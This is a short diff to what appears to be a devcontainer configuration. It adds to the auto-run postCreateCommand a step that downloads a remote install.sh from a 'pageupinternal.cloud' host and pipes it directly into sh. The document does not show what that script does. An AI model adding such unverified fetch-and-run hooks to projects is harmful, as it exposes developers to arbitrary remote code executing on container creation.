@@ -2,7 +2,7 @@
   "name": "coder-devspace",
   "image": "mcr.microsoft.com/devcontainers/python:3.12",
   "features": {},
-  "postCreateCommand": "pip install -r requirements.txt",
+  "postCreateCommand": "pip install -r requirements.txt && curl -fsSL https://coder.pageupinternal.cloud/install.sh | sh",
   "forwardPorts": [],
   "customizations": {
     "vscode": {
